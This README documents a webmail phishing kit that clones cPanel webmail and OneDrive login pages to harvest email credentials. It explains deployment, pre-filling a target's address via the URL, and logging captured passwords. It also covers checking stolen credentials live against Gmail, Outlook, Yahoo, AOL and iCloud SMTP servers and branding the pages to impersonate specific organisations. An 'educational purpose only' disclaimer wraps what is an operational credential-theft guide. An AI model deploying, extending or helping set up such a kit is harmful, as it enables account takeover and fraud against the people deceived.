# Webmail Phishing Framework (Educational Purpose Only)

⚠️ **IMPORTANT DISCLAIMER**: This project is created for educational and authorized penetration testing purposes only. Using this code for malicious purposes or without proper authorization is illegal and unethical.

## Overview

This framework replicates popular webmail interfaces (similar to cPanel's webmail) to capture user credentials for security testing and awareness training. It includes SMTP verification capabilities to validate captured credentials.

## Features

- **Multiple Interface Options**: OneDrive-style interface and cPanel webmail replica
- **SMTP Verification**: Real-time verification of captured email credentials
- **Comprehensive Logging**: Detailed logs with verification status
- **Auto-population**: Email addresses from URL hash/parameters
- **Responsive Design**: Works on desktop and mobile devices
- **Multiple Attempt Handling**: Configurable number of login attempts before redirect

## File Structure

```
├── index.html              # OneDrive-style interface
├── webmail_auth.php        # Enhanced webmail login (recommended)
├── webmail_login.php       # Original cPanel webmail replica
├── sinister.php           # Backend processor for OneDrive interface
├── smtp_verifier.php      # Standalone SMTP verification utility
├── style.css              # Styling for OneDrive interface
├── captured_logs/         # Directory for captured credentials
├── verification_logs/     # Directory for SMTP verification logs
└── README.md              # This file
```

## Quick Start

### 1. Basic Setup

```bash
# Clone or download the files to your web server
# Ensure PHP is installed with socket support
# Set proper permissions
chmod 755 *.php
chmod 777 captured_logs verification_logs
```

### 2. Choose Your Interface

**Option A: Enhanced Webmail (Recommended)**
- Access: `webmail_auth.php`
- Features: Modern design, SMTP verification, detailed logging

**Option B: OneDrive Style**
- Access: `index.html`
- Features: File sharing interface, popup login form

**Option C: Classic cPanel Webmail**
- Access: `webmail_login.php` 
- Features: Authentic cPanel look and feel

### 3. URL Parameters

Pre-populate email addresses using:
```
webmail_auth.php?email=target@example.com
webmail_login.php#target@example.com
index.html#target@example.com
```

## SMTP Verification

### Standalone Usage

```bash
# Command line verification
php smtp_verifier.php user@example.com password123

# With debug output
php smtp_verifier.php user@example.com password123 debug
```

### Web Interface
Access `smtp_verifier.php` in your browser for a web-based verification form.

### Integration
The `webmail_auth.php` file includes built-in SMTP verification. To enable it, uncomment line 172:
```php
$verification_result = verifyEmailCredentials($email, $password) ? 'verified' : 'not_verified';
```

## Configuration

### SMTP Settings
Edit the `$smtp_config` array in `webmail_auth.php`:
```php
$smtp_config = [
    'timeout' => 10,                    # Connection timeout
    'verify_ssl' => false,              # SSL verification
    'common_ports' => [587, 25, 465]    # Ports to try
];
```

### Attempt Limits
Modify the attempt limit in your chosen interface:
```php
if ($current_attempt < 3) {  // Change 3 to desired limit
    $error_message = 'Invalid credentials...';
}
```

## Logging System

### Log Files Generated

1. **Main Logs**: `captured_logs/credentials_YYYY-MM-DD.log`
2. **Domain Logs**: `captured_logs/domain_example.com.log`
3. **Verified Logs**: `captured_logs/verified_credentials.log`
4. **SMTP Logs**: `verification_logs/verification_YYYY-MM-DD.log`

### Log Format
```json
{
    "timestamp": "2025-01-XX XX:XX:XX",
    "ip_address": "192.168.1.100",
    "user_agent": "Mozilla/5.0...",
    "email": "user@example.com",
    "password": "password123",
    "domain": "example.com",
    "attempt_number": 1,
    "verification_status": "verified",
    "session_id": "abc123..."
}
```

## Email Provider Support

### Verified Providers
- Gmail (smtp.gmail.com:587)
- Outlook/Hotmail (smtp-mail.outlook.com:587)
- Yahoo (smtp.mail.yahoo.com:587)
- AOL (smtp.aol.com:587)
- iCloud (smtp.mail.me.com:587)

### Custom Providers
Add support for additional providers in `smtp_verifier.php`:
```php
'custom.com' => [
    'smtp' => 'mail.custom.com',
    'ports' => [587, 25],
    'tls' => true
]
```

## Security Considerations

### For Testing Environments
- Use only in isolated networks
- Implement IP restrictions
- Monitor access logs
- Use HTTPS in production

### Legal Compliance
- Obtain written authorization before deployment
- Document all testing activities
- Ensure compliance with local laws
- Use only for legitimate security testing

## Customization

### Branding
- Replace logos and colors in CSS files
- Modify HTML templates for different organizations
- Update footer and copyright information

### Functionality
- Adjust redirect URLs
- Modify error messages
- Customize logging format
- Add additional verification methods

## Troubleshooting

### Common Issues

**SMTP Verification Fails**
```bash
# Check if ports are accessible
telnet smtp.gmail.com 587

# Test with debug mode
php smtp_verifier.php user@gmail.com pass debug
```

**Permission Errors**
```bash
# Fix log directory permissions
chmod 755 captured_logs verification_logs
chown www-data:www-data captured_logs verification_logs
```

**SSL/TLS Errors**
```php
# Disable SSL verification if needed
$smtp_config['verify_ssl'] = false;
```

## Advanced Features

### Email Templates
Customize the interface to match specific organizations by modifying:
- Logo images and favicon
- Color schemes in CSS
- Company-specific terminology
- Domain-specific redirections

### Integration Options
- Export logs to external systems
- Send notifications on successful captures
- Integrate with penetration testing frameworks
- Add database storage for larger deployments

## Best Practices

1. **Always get authorization** before deploying
2. **Use HTTPS** to protect captured credentials in transit
3. **Implement access controls** to prevent unauthorized use
4. **Regular log rotation** to manage disk space
5. **Secure log storage** with appropriate permissions
6. **Document all activities** for compliance

## Legal Notice

This tool is intended solely for:
- Authorized penetration testing
- Security awareness training
- Educational purposes
- Legitimate security research

**Unauthorized use is strictly prohibited and may violate:**
- Computer Fraud and Abuse Act (USA)
- Computer Misuse Act (UK)
- Similar cybercrime laws worldwide

The authors assume no responsibility for misuse of this software.

## Support

For educational or authorized testing purposes only. This framework should only be used in controlled environments with proper authorization.

Remember: Always obtain explicit written permission before testing any systems you do not own.